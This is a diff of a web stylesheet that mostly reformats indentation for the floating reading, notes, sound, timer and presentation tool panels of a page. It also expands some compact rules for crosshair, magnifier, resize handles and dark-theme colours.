-@media(max-width:480px) {
+
+    @media(max-width:480px) {
 
 
-        
-#readingToolsFab,
-#asyncNotesFab,
-#asyncSoundFab {
+
+        #readingToolsFab,
+        #asyncNotesFab,
+        #asyncSoundFab {
             right: 13px !important;
             width: 44px !important;
             height: 44px !important
         }
 
 
-        
-#readingToolsFab {
+
+        #readingToolsFab {
             bottom: 18px !important
         }
 
 
-        
-#asyncNotesFab {
+
+        #asyncNotesFab {
             bottom: 70px !important
         }
 
 
-        
 
 
-        
-#asyncSoundFab {
+
+
+        #asyncSoundFab {
             bottom: 174px !important
         }
 
-    
-}
+
+    }
 
 
 
-    
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-
-
-    
-@media(max-width:480px) {
-
-        
-
-
-        
-
-
-        
-
-
-        
-
-    
-}
 
 
 
-    
-#readingToolsFab,
-#asyncNotesFab,
-#asyncSoundFab {
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    @media(max-width:480px) {}
+
+
+
+
+    #readingToolsFab,
+    #asyncNotesFab,
+    #asyncSoundFab {
         display: none !important
     }
 
 
-    
-#asyncToolsDock {
+
+    #asyncToolsDock {
         position: fixed;
         right: 22px;
         bottom: 22px;
@@ -1679,8 +1664,8 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#asyncToolsFab {
+
+    #asyncToolsFab {
         width: 48px;
         height: 48px;
         border: 1px solid rgba(255, 255, 255, .52);
@@ -1696,24 +1681,25 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#asyncToolsFab[aria-expanded=true] {
+
+    #asyncToolsFab[aria-expanded=true] {
         transform: rotate(90deg) scale(1.02);
         border-radius: 50%;
         box-shadow: 0 12px 30px rgba(37, 76, 180, .4)
     }
 
-#asyncToolsFab i {
+    #asyncToolsFab i {
         display: inline-block;
         transition: transform .52s cubic-bezier(.65, 0, .35, 1), opacity .22s ease;
     }
-#asyncToolsFab[aria-expanded="true"] i {
+
+    #asyncToolsFab[aria-expanded="true"] i {
         transform: rotate(180deg) scale(1.08);
     }
 
 
-    
-#asyncToolsMenu {
+
+    #asyncToolsMenu {
         display: flex;
         flex-direction: column-reverse;
         gap: 8px;
@@ -1726,8 +1712,8 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#asyncToolsMenu.is-visible {
+
+    #asyncToolsMenu.is-visible {
         opacity: 1;
         visibility: visible;
         pointer-events: auto;
@@ -1735,8 +1721,8 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#asyncToolsMenu button {
+
+    #asyncToolsMenu button {
         display: flex;
         align-items: center;
         gap: 11px;
@@ -1756,49 +1742,49 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#asyncToolsMenu button:nth-child(2) {
+
+    #asyncToolsMenu button:nth-child(2) {
         background: rgba(13, 148, 136, .78)
     }
 
 
-    
-#asyncToolsMenu button:nth-child(3) {
+
+    #asyncToolsMenu button:nth-child(3) {
         background: rgba(124, 58, 237, .78)
     }
 
 
-    
-#asyncToolsMenu button:nth-child(4) {
+
+    #asyncToolsMenu button:nth-child(4) {
         background: rgba(217, 119, 6, .78)
     }
 
 
-    
-#asyncToolsMenu button:nth-child(5) {
+
+    #asyncToolsMenu button:nth-child(5) {
         background: rgba(225, 29, 72, .78)
     }
 
 
-    
-#asyncToolsMenu button:hover {
+
+    #asyncToolsMenu button:hover {
         transform: translateX(-4px) scale(1.025);
         filter: brightness(1.08)
     }
 
 
-    
-#asyncToolsMenu button i {
+
+    #asyncToolsMenu button i {
         width: 20px;
         text-align: center;
         font-size: 17px
     }
 
 
-    
-#readingToolsPanel,
-#asyncNotesPanel,
-#asyncSoundPanel {
+
+    #readingToolsPanel,
+    #asyncNotesPanel,
+    #asyncSoundPanel {
         left: 50% !important;
         top: 50% !important;
         right: auto !important;
@@ -1809,16 +1795,16 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#readingToolsPanel.is-open,
-#asyncNotesPanel.is-open,
-#asyncSoundPanel.is-open {
+
+    #readingToolsPanel.is-open,
+    #asyncNotesPanel.is-open,
+    #asyncSoundPanel.is-open {
         animation: asyncToolPop .2s ease-out
     }
 
 
-    
-@keyframes asyncToolPop {
+
+    @keyframes asyncToolPop {
         from {
             opacity: .6;
             scale: .96
@@ -1831,39 +1817,39 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#readingToolsPanel[data-user-positioned="1"],
-#asyncNotesPanel[data-user-positioned="1"],
-#asyncSoundPanel[data-user-positioned="1"] {
+
+    #readingToolsPanel[data-user-positioned="1"],
+    #asyncNotesPanel[data-user-positioned="1"],
+    #asyncSoundPanel[data-user-positioned="1"] {
         transform: none !important
     }
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
-.supplemental-heading {
+
+
+
+
+
+
+    .supplemental-heading {
         font-size: 12px;
         font-weight: 800;
         color: var(--aux-text)
     }
 
 
-    
-.supplemental-heading small {
+
+    .supplemental-heading small {
         display: block;
         font-size: 10px;
         font-weight: 400;
@@ -1872,8 +1858,8 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#asyncSupplementalSounds {
+
+    #asyncSupplementalSounds {
         display: grid;
         grid-template-columns: repeat(3, minmax(0, 1fr));
         gap: 6px;
@@ -1882,8 +1868,8 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#asyncSupplementalSounds button {
+
+    #asyncSupplementalSounds button {
         padding: 8px 4px;
         border: 1px solid var(--aux-border);
         border-radius: 8px;
@@ -1894,8 +1880,8 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#asyncSupplementalSounds button.active {
+
+    #asyncSupplementalSounds button.active {
         background: rgba(16, 185, 129, .18);
         border-color: #10b981;
         color: var(--aux-text);
@@ -1903,24 +1889,24 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#asyncSupplementalSounds button {
+
+    #asyncSupplementalSounds button {
         min-height: 34px;
         transition: background .18s ease, border-color .18s ease, transform .18s ease
     }
 
 
-    
-#asyncSupplementalSounds button:hover {
+
+    #asyncSupplementalSounds button:hover {
         transform: translateY(-1px);
         border-color: #60a5fa
     }
 
 
-    
-html[data-theme="dark"] #readingToolsPanel,
-html[data-theme="dark"] #asyncNotesPanel,
-html[data-theme="dark"] #asyncSoundPanel {
+
+    html[data-theme="dark"] #readingToolsPanel,
+    html[data-theme="dark"] #asyncNotesPanel,
+    html[data-theme="dark"] #asyncSoundPanel {
         --aux-text: #f1f5f9 !important;
         --aux-editor-text: #f1f5f9 !important;
         --aux-control: rgba(255, 255, 255, .09) !important;
@@ -1931,130 +1917,130 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-html[data-theme="dark"] #readingToolsPanel :is(p, span, label, small, strong, div, h1, h2, h3, h4, li),
-html[data-theme="dark"] #asyncNotesPanel :is(p, span, label, small, strong, div, h1, h2, h3, h4, li),
-html[data-theme="dark"] #asyncSoundPanel :is(p, span, label, small, strong, div, h1, h2, h3, h4, li) {
+
+    html[data-theme="dark"] #readingToolsPanel :is(p, span, label, small, strong, div, h1, h2, h3, h4, li),
+    html[data-theme="dark"] #asyncNotesPanel :is(p, span, label, small, strong, div, h1, h2, h3, h4, li),
+    html[data-theme="dark"] #asyncSoundPanel :is(p, span, label, small, strong, div, h1, h2, h3, h4, li) {
         color: var(--aux-text)
     }
 
 
-    
-html[data-theme="dark"] #readingToolsPanel :is(input, select, textarea),
-html[data-theme="dark"] #asyncNotesPanel :is(input, select, textarea),
-html[data-theme="dark"] #asyncSoundPanel :is(input, select, textarea) {
+
+    html[data-theme="dark"] #readingToolsPanel :is(input, select, textarea),
+    html[data-theme="dark"] #asyncNotesPanel :is(input, select, textarea),
+    html[data-theme="dark"] #asyncSoundPanel :is(input, select, textarea) {
         background: #172033 !important;
         color: #f8fafc !important;
         border-color: var(--aux-border) !important
     }
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel .ql-editor {
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-editor {
         color: #f1f5f9 !important
     }
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-picker-options {
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-picker-options {
         background: #172033;
         color: #f1f5f9
     }
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-picker-item {
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-picker-item {
         color: #f1f5f9
     }
 
 
-    
-html[data-theme="dark"] #readingToolsPanel .rt-btn,
-html[data-theme="dark"] #asyncSoundPanel button {
+
+    html[data-theme="dark"] #readingToolsPanel .rt-btn,
+    html[data-theme="dark"] #asyncSoundPanel button {
         color: #f8fafc
     }
 
 
-    
-html[data-theme="dark"] #asyncFloatingTimer {
+
+    html[data-theme="dark"] #asyncFloatingTimer {
         color: #f8fafc !important;
         background: rgba(25, 32, 45, .97) !important;
         border-color: rgba(203, 213, 225, .25) !important
     }
 
 
-    
-html[data-theme="dark"] #asyncFloatingTimer :is(strong, label, span, div, p) {
+
+    html[data-theme="dark"] #asyncFloatingTimer :is(strong, label, span, div, p) {
         color: #f1f5f9 !important
     }
 
 
-    
-html[data-theme="dark"] #asyncFloatingTimer input {
+
+    html[data-theme="dark"] #asyncFloatingTimer input {
         background: #172033 !important;
         color: #f8fafc !important;
         border-color: rgba(203, 213, 225, .28) !important
     }
 
 
-    
-html[data-theme="dark"] #readingToolsPanel button:not(.rt-header button),
-html[data-theme="dark"] #asyncNotesPanel button,
-html[data-theme="dark"] #asyncSoundPanel button {
+
+    html[data-theme="dark"] #readingToolsPanel button:not(.rt-header button),
+    html[data-theme="dark"] #asyncNotesPanel button,
+    html[data-theme="dark"] #asyncSoundPanel button {
         color: #f8fafc
     }
 
 
-    
-@media(max-width:520px) {
 
-        
-#asyncToolsDock {
+    @media(max-width:520px) {
+
+
+        #asyncToolsDock {
             right: 12px;
             bottom: 12px
         }
 
 
-        
-#asyncToolsFab {
+
+        #asyncToolsFab {
             width: 44px;
             height: 44px;
             border-radius: 14px;
         }
 
 
-        
-#asyncToolsMenu button {
+
+        #asyncToolsMenu button {
             min-width: 158px;
             padding: 10px 12px
         }
 
 
-        
-#readingToolsPanel,
-#asyncNotesPanel,
-#asyncSoundPanel {
+
+        #readingToolsPanel,
+        #asyncNotesPanel,
+        #asyncSoundPanel {
             width: calc(100vw - 14px) !important;
             max-height: calc(100dvh - 14px) !important
         }
 
 
-        
 
 
-        
-#asyncSupplementalSounds {
+
+
+        #asyncSupplementalSounds {
             grid-template-columns: repeat(2, minmax(0, 1fr));
             max-height: 130px
         }
 
-    
-}
+
+    }
 
 
 
-    
-#asyncPresentationPanel {
+
+    #asyncPresentationPanel {
         display: none;
         position: fixed;
         z-index: 100090;
@@ -2074,8 +2060,8 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationPanel.is-open {
+
+    #asyncPresentationPanel.is-open {
         display: flex;
         flex-direction: column;
         gap: 12px;
@@ -2083,22 +2069,22 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationPanel.is-minimized {
+
+    #asyncPresentationPanel.is-minimized {
         display: none !important
     }
 
 
-    
-#asyncPresentationPanel .presentation-actions {
+
+    #asyncPresentationPanel .presentation-actions {
         display: grid;
         grid-template-columns: repeat(2, minmax(0, 1fr));
         gap: 8px
     }
 
 
-    
-#asyncPresentationPanel .presentation-actions button {
+
+    #asyncPresentationPanel .presentation-actions button {
         padding: 11px 9px;
         border: 1px solid var(--aux-border);
         border-radius: 10px;
@@ -2108,8 +2094,8 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationPanel .presentation-actions button.active {
+
+    #asyncPresentationPanel .presentation-actions button.active {
         background: rgba(37, 99, 235, .18);
         border-color: #3b82f6;
         color: var(--aux-text);
@@ -2117,8 +2103,8 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationOverlay {
+
+    #asyncPresentationOverlay {
         display: none;
         position: fixed;
         inset: 0;
@@ -2127,14 +2113,14 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationOverlay.active {
+
+    #asyncPresentationOverlay.active {
         display: block
     }
 
 
-    
-#asyncPresentationCursor {
+
+    #asyncPresentationCursor {
         position: fixed;
         left: 0;
         top: 0;
@@ -2147,19 +2133,76 @@ html[data-theme="dark"] #asyncSoundPanel button {
         display: none
     }
 
-#asyncPresentationCrosshair { display:none;position:fixed;inset:0; }
-#asyncPresentationCrosshair span { position:absolute;background:rgba(37,99,235,.85);box-shadow:0 0 2px #fff; }
-#asyncPresentationCrosshair span:first-child { left:0;right:0;height:1px;top:50%; }
-#asyncPresentationCrosshair span:last-child { top:0;bottom:0;width:1px;left:50%; }
-#asyncPresentationOverlay.mode-crosshair #asyncPresentationCrosshair { display:block; }
-#asyncPresentationMagnifier { display:none;position:fixed;left:0;top:0;width:170px;height:170px;border:3px solid #2563eb;border-radius:50%;overflow:hidden;background:rgba(255,255,255,.12);box-shadow:0 8px 30px rgba(0,0,0,.3);transform:translate(22px,22px); }
-#asyncPresentationOverlay.mode-magnifier #asyncPresentationMagnifier { display:block; }
-#asyncPresentationMagnifierContent { position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font:800 22px/1.25 system-ui;background:rgba(15,23,42,.78);text-align:center;padding:12px;overflow:hidden; }
-#asyncPresentationOverlay.mode-ruler { cursor:crosshair; }
+    #asyncPresentationCrosshair {
+        display: none;
+        position: fixed;
+        inset: 0;
+    }
+
+    #asyncPresentationCrosshair span {
+        position: absolute;
+        background: rgba(37, 99, 235, .85);
+        box-shadow: 0 0 2px #fff;
+    }
+
+    #asyncPresentationCrosshair span:first-child {
+        left: 0;
+        right: 0;
+        height: 1px;
+        top: 50%;
+    }
+
+    #asyncPresentationCrosshair span:last-child {
+        top: 0;
+        bottom: 0;
+        width: 1px;
+        left: 50%;
+    }
+
+    #asyncPresentationOverlay.mode-crosshair #asyncPresentationCrosshair {
+        display: block;
+    }
+
+    #asyncPresentationMagnifier {
+        display: none;
+        position: fixed;
+        left: 0;
+        top: 0;
+        width: 170px;
+        height: 170px;
+        border: 3px solid #2563eb;
+        border-radius: 50%;
+        overflow: hidden;
+        background: rgba(255, 255, 255, .12);
+        box-shadow: 0 8px 30px rgba(0, 0, 0, .3);
+        transform: translate(22px, 22px);
+    }
+
+    #asyncPresentationOverlay.mode-magnifier #asyncPresentationMagnifier {
+        display: block;
+    }
+
+    #asyncPresentationMagnifierContent {
+        position: absolute;
+        inset: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #fff;
+        font: 800 22px/1.25 system-ui;
+        background: rgba(15, 23, 42, .78);
+        text-align: center;
+        padding: 12px;
+        overflow: hidden;
+    }
+
+    #asyncPresentationOverlay.mode-ruler {
+        cursor: crosshair;
+    }
 
 
-    
-#asyncPresentationOverlay.mode-pointer #asyncPresentationCursor {
+
+    #asyncPresentationOverlay.mode-pointer #asyncPresentationCursor {
         width: 24px;
         height: 24px;
         background: transparent;
@@ -2168,28 +2211,28 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationOverlay.mode-laser #asyncPresentationCursor {
+
+    #asyncPresentationOverlay.mode-laser #asyncPresentationCursor {
         display: block
     }
 
 
-    
-#asyncPresentationOverlay.mode-pointer #asyncPresentationCursor {
+
+    #asyncPresentationOverlay.mode-pointer #asyncPresentationCursor {
         display: block
     }
 
 
-    
-#asyncPresentationOverlay.mode-spotlight {
+
+    #asyncPresentationOverlay.mode-spotlight {
         background: rgba(0, 0, 0, .68);
         -webkit-mask: radial-gradient(circle 95px at var(--spot-x, 50%) var(--spot-y, 50%), transparent 0 90px, #000 98px);
         mask: radial-gradient(circle 95px at var(--spot-x, 50%) var(--spot-y, 50%), transparent 0 90px, #000 98px)
     }
 
 
-    
-#asyncPresentationOverlay.mode-spotlight #asyncPresentationSpotlight {
+
+    #asyncPresentationOverlay.mode-spotlight #asyncPresentationSpotlight {
         display: block;
         position: fixed;
         left: var(--spot-x, 50%);
@@ -2203,8 +2246,8 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationCanvas {
+
+    #asyncPresentationCanvas {
         position: absolute;
         inset: 0;
         width: 100%;
@@ -2214,41 +2257,41 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationOverlay.mode-draw {
+
+    #asyncPresentationOverlay.mode-draw {
         pointer-events: auto;
         cursor: crosshair
     }
 
 
-    
-#asyncPresentationOverlay.mode-draw #asyncPresentationCanvas {
+
+    #asyncPresentationOverlay.mode-draw #asyncPresentationCanvas {
         pointer-events: auto;
         cursor: crosshair
     }
 
 
-    
-#asyncPresentationPanel[data-user-positioned="1"] {
+
+    #asyncPresentationPanel[data-user-positioned="1"] {
         transform: none !important
     }
 
 
-    
-/* Resize controls for the actual floating tool windows (not the launcher). */
 
-    
-#readingToolsPanel,
-#asyncNotesPanel,
-#asyncSoundPanel,
-#asyncPresentationPanel,
-#asyncFloatingTimer {
+    /* Resize controls for the actual floating tool windows (not the launcher). */
+
+
+    #readingToolsPanel,
+    #asyncNotesPanel,
+    #asyncSoundPanel,
+    #asyncPresentationPanel,
+    #asyncFloatingTimer {
         box-sizing: border-box;
     }
 
 
-    
-.async-tool-resize-handle {
+
+    .async-tool-resize-handle {
         position: absolute;
         z-index: 100;
         display: block;
@@ -2265,23 +2308,23 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#readingToolsPanel:hover .async-tool-resize-handle,
-#asyncNotesPanel:hover .async-tool-resize-handle,
-#asyncSoundPanel:hover .async-tool-resize-handle,
-#asyncPresentationPanel:hover .async-tool-resize-handle,
-#asyncFloatingTimer:hover .async-tool-resize-handle,
-.async-tool-resize-handle:focus-visible,
-.async-tool-resize-handle:hover,
-.async-tool-resize-handle:active {
+
+    #readingToolsPanel:hover .async-tool-resize-handle,
+    #asyncNotesPanel:hover .async-tool-resize-handle,
+    #asyncSoundPanel:hover .async-tool-resize-handle,
+    #asyncPresentationPanel:hover .async-tool-resize-handle,
+    #asyncFloatingTimer:hover .async-tool-resize-handle,
+    .async-tool-resize-handle:focus-visible,
+    .async-tool-resize-handle:hover,
+    .async-tool-resize-handle:active {
         opacity: .95;
         background: rgba(96, 165, 250, .22);
     }
 
 
-    
-.async-tool-resize-handle[data-resize="n"],
-.async-tool-resize-handle[data-resize="s"] {
+
+    .async-tool-resize-handle[data-resize="n"],
+    .async-tool-resize-handle[data-resize="s"] {
         left: 14px;
         right: 14px;
         height: 9px;
@@ -2289,21 +2332,21 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-.async-tool-resize-handle[data-resize="n"] {
+
+    .async-tool-resize-handle[data-resize="n"] {
         top: 1px;
     }
 
 
-    
-.async-tool-resize-handle[data-resize="s"] {
+
+    .async-tool-resize-handle[data-resize="s"] {
         bottom: 1px;
     }
 
 
-    
-.async-tool-resize-handle[data-resize="e"],
-.async-tool-resize-handle[data-resize="w"] {
+
+    .async-tool-resize-handle[data-resize="e"],
+    .async-tool-resize-handle[data-resize="w"] {
         top: 14px;
         bottom: 14px;
         width: 9px;
@@ -2311,23 +2354,23 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-.async-tool-resize-handle[data-resize="e"] {
+
+    .async-tool-resize-handle[data-resize="e"] {
         right: 1px;
     }
 
 
-    
-.async-tool-resize-handle[data-resize="w"] {
+
+    .async-tool-resize-handle[data-resize="w"] {
         left: 1px;
     }
 
 
-    
-.async-tool-resize-handle[data-resize="ne"],
-.async-tool-resize-handle[data-resize="nw"],
-.async-tool-resize-handle[data-resize="se"],
-.async-tool-resize-handle[data-resize="sw"] {
+
+    .async-tool-resize-handle[data-resize="ne"],
+    .async-tool-resize-handle[data-resize="nw"],
+    .async-tool-resize-handle[data-resize="se"],
+    .async-tool-resize-handle[data-resize="sw"] {
         width: 17px;
         height: 17px;
         border: 1px solid rgba(255, 255, 255, .58);
@@ -2337,70 +2380,70 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-.async-tool-resize-handle[data-resize="ne"] {
+
+    .async-tool-resize-handle[data-resize="ne"] {
         top: 2px;
         right: 2px;
         cursor: nesw-resize;
     }
 
 
-    
-.async-tool-resize-handle[data-resize="nw"] {
+
+    .async-tool-resize-handle[data-resize="nw"] {
         top: 2px;
         left: 2px;
         cursor: nwse-resize;
     }
 
 
-    
-.async-tool-resize-handle[data-resize="se"] {
+
+    .async-tool-resize-handle[data-resize="se"] {
         bottom: 2px;
         right: 2px;
         cursor: nwse-resize;
     }
 
 
-    
-.async-tool-resize-handle[data-resize="sw"] {
+
+    .async-tool-resize-handle[data-resize="sw"] {
         bottom: 2px;
         left: 2px;
         cursor: nesw-resize;
     }
 
 
-    
-#readingToolsPanel.is-minimized .async-tool-resize-handle,
-#asyncNotesPanel.is-minimized .async-tool-resize-handle,
-#asyncSoundPanel.is-minimized .async-tool-resize-handle,
-#asyncPresentationPanel.is-minimized .async-tool-resize-handle,
-#asyncFloatingTimer.is-minimized .async-tool-resize-handle {
+
+    #readingToolsPanel.is-minimized .async-tool-resize-handle,
+    #asyncNotesPanel.is-minimized .async-tool-resize-handle,
+    #asyncSoundPanel.is-minimized .async-tool-resize-handle,
+    #asyncPresentationPanel.is-minimized .async-tool-resize-handle,
+    #asyncFloatingTimer.is-minimized .async-tool-resize-handle {
         display: none !important;
     }
 
 
-    
-@media (max-width: 480px) {
+
+    @media (max-width: 480px) {
 
 
-        
-.async-tool-resize-handle[data-resize="ne"],
-.async-tool-resize-handle[data-resize="nw"],
-.async-tool-resize-handle[data-resize="se"],
-.async-tool-resize-handle[data-resize="sw"] {
+
+        .async-tool-resize-handle[data-resize="ne"],
+        .async-tool-resize-handle[data-resize="nw"],
+        .async-tool-resize-handle[data-resize="se"],
+        .async-tool-resize-handle[data-resize="sw"] {
             width: 20px;
             height: 20px;
         }
 
-    
-}
+
+    }
 
 
 
-    
-/* Neutral icon controls are styled in the final theme-aware rules below. */
 
-#aftTickToggle {
+    /* Neutral icon controls are styled in the final theme-aware rules below. */
+
+    #aftTickToggle {
         width: 29px;
         height: 29px;
         flex: 0 0 29px;
@@ -2416,54 +2459,54 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#aftTickToggle[aria-pressed="false"] {
+
+    #aftTickToggle[aria-pressed="false"] {
         opacity: .65;
         background: rgba(15, 23, 42, .2)
     }
 
 
-    
-/* Match the title bar color with the tool's colored launcher/menu entry. */
 
-    
-#readingToolsPanel .rt-header {
+    /* Match the title bar color with the tool's colored launcher/menu entry. */
+
+
+    #readingToolsPanel .rt-header {
         background: #3b82f6 !important
     }
 
 
-    
-#asyncNotesPanel .aux-head {
+
+    #asyncNotesPanel .aux-head {
         background: #0d9488 !important
     }
 
 
-    
 
 
-    
-#asyncSoundPanel .aux-head {
+
+
+    #asyncSoundPanel .aux-head {
         background: #d97706 !important
     }
 
 
-    
-#asyncPresentationPanel .aux-head {
+
+    #asyncPresentationPanel .aux-head {
         background: #e11d48 !important
     }
 
 
-    
-#asyncFloatingTimer .aft-header {
+
+    #asyncFloatingTimer .aft-header {
         background: #3b82f6
     }
 
 
-    
-/* Quill formatting buttons: clean spacing and responsive wrapping. */
 
-    
-#asyncNotesPanel .ql-toolbar.ql-snow {
+    /* Quill formatting buttons: clean spacing and responsive wrapping. */
+
+
+    #asyncNotesPanel .ql-toolbar.ql-snow {
         display: flex;
         flex-wrap: wrap;
         align-items: center;
@@ -2474,8 +2517,8 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncNotesPanel .ql-toolbar.ql-snow .ql-formats {
+
+    #asyncNotesPanel .ql-toolbar.ql-snow .ql-formats {
         display: inline-flex;
         align-items: center;
         flex-wrap: wrap;
@@ -2484,8 +2527,8 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncNotesPanel .ql-toolbar.ql-snow button {
+
+    #asyncNotesPanel .ql-toolbar.ql-snow button {
         width: 29px;
         height: 29px;
         padding: 4px !important;
@@ -2494,59 +2537,59 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncNotesPanel .ql-toolbar.ql-snow .ql-picker {
+
+    #asyncNotesPanel .ql-toolbar.ql-snow .ql-picker {
         height: 29px;
         margin: 0 2px
     }
 
 
-    
-#asyncNotesPanel .ql-toolbar.ql-snow .ql-picker-label {
+
+    #asyncNotesPanel .ql-toolbar.ql-snow .ql-picker-label {
         padding: 3px 5px;
         border-radius: 6px
     }
 
 
-    
-#asyncNotesPanel .ql-toolbar.ql-snow .ql-picker-options {
+
+    #asyncNotesPanel .ql-toolbar.ql-snow .ql-picker-options {
         max-height: 220px;
         overflow: auto
     }
 
 
-    
-@media(max-width:480px) {
 
-        
-#asyncNotesPanel .ql-toolbar.ql-snow {
+    @media(max-width:480px) {
+
+
+        #asyncNotesPanel .ql-toolbar.ql-snow {
             gap: 3px;
             padding: 7px 6px !important
         }
 
 
-        
-#asyncNotesPanel .ql-toolbar.ql-snow .ql-formats {
+
+        #asyncNotesPanel .ql-toolbar.ql-snow .ql-formats {
             gap: 2px;
             margin-right: 4px !important
         }
 
 
-        
-#asyncNotesPanel .ql-toolbar.ql-snow button {
+
+        #asyncNotesPanel .ql-toolbar.ql-snow button {
             width: 27px;
             height: 27px
         }
 
-    
-}
+
+    }
 
 
-    
-/* Presentation minimization collapses to an interactive icon toolbar. */
 
-    
-#asyncPresentationPanel.is-minimized {
+    /* Presentation minimization collapses to an interactive icon toolbar. */
+
+
+    #asyncPresentationPanel.is-minimized {
         display: flex !important;
         flex-direction: column;
         width: max-content !important;
@@ -2561,14 +2604,14 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationPanel.is-minimized>:not(.aux-head):not(.presentation-actions) {
+
+    #asyncPresentationPanel.is-minimized>:not(.aux-head):not(.presentation-actions) {
         display: none !important
     }
 
 
-    
-#asyncPresentationPanel.is-minimized .aux-head {
+
+    #asyncPresentationPanel.is-minimized .aux-head {
         padding: 2px 3px !important;
         min-height: 14px;
         gap: 4px;
@@ -2576,21 +2619,21 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationPanel.is-minimized .aux-head>strong,
-#asyncPresentationPanel.is-minimized .aux-drag-hint {
+
+    #asyncPresentationPanel.is-minimized .aux-head>strong,
+    #asyncPresentationPanel.is-minimized .aux-drag-hint {
         display: none !important
     }
 
 
-    
-#asyncPresentationPanel.is-minimized .aux-window-actions {
+
+    #asyncPresentationPanel.is-minimized .aux-window-actions {
         margin: 0 !important
     }
 
 
-    
-#asyncPresentationPanel.is-minimized .presentation-actions {
+
+    #asyncPresentationPanel.is-minimized .presentation-actions {
         display: flex !important;
         flex-wrap: wrap;
         justify-content: center;
@@ -2598,8 +2641,8 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationPanel.is-minimized .presentation-actions button {
+
+    #asyncPresentationPanel.is-minimized .presentation-actions button {
         display: inline-flex;
         align-items: center;
         justify-content: center;
@@ -2615,25 +2658,25 @@ html[data-theme="dark"] #asyncSoundPanel button {
     }
 
 
-    
-#asyncPresentationPanel.is-minimized .presentation-actions button i {
+
+    #asyncPresentationPanel.is-minimized .presentation-actions button i {
         font-size: 15px;
         line-height: 1
     }
 
 
-    
-#asyncPresentationPanel.is-minimized .presentation-actions button.active {
+
+    #asyncPresentationPanel.is-minimized .presentation-actions button.active {
         background: rgba(225, 29, 72, .2) !important;
         border-color: #e11d48 !important
     }
 
 
-    
-/* Correct light/dark presentation text and controls. */
 
-    
-html[data-theme="dark"] #asyncPresentationPanel {
+    /* Correct light/dark presentation text and controls. */
+
+
+    html[data-theme="dark"] #asyncPresentationPanel {
         --aux-text: #f1f5f9 !important;
         --aux-control: rgba(255, 255, 255, .09) !important;
         --aux-border: rgba(203, 213, 225, .3) !important;
@@ -2643,133 +2686,133 @@ html[data-theme="dark"] #asyncPresentationPanel {
     }
 
 
-    
-html[data-theme="dark"] #asyncPresentationPanel>p,
-html[data-theme="dark"] #asyncPresentationPanel label,
-html[data-theme="dark"] #asyncPresentationPanel label span,
-html[data-theme="dark"] #asyncPresentationPanel #asyncPresentationStatus {
+
+    html[data-theme="dark"] #asyncPresentationPanel>p,
+    html[data-theme="dark"] #asyncPresentationPanel label,
+    html[data-theme="dark"] #asyncPresentationPanel label span,
+    html[data-theme="dark"] #asyncPresentationPanel #asyncPresentationStatus {
         color: #f1f5f9 !important
     }
 
 
-    
-html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button {
+
+    html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button {
         background: rgba(255, 255, 255, .08) !important;
         border-color: rgba(203, 213, 225, .3) !important;
         color: #f8fafc !important
     }
 
 
-    
-html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.active {
+
+    html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.active {
         background: rgba(225, 29, 72, .24) !important;
         border-color: #fb7185 !important;
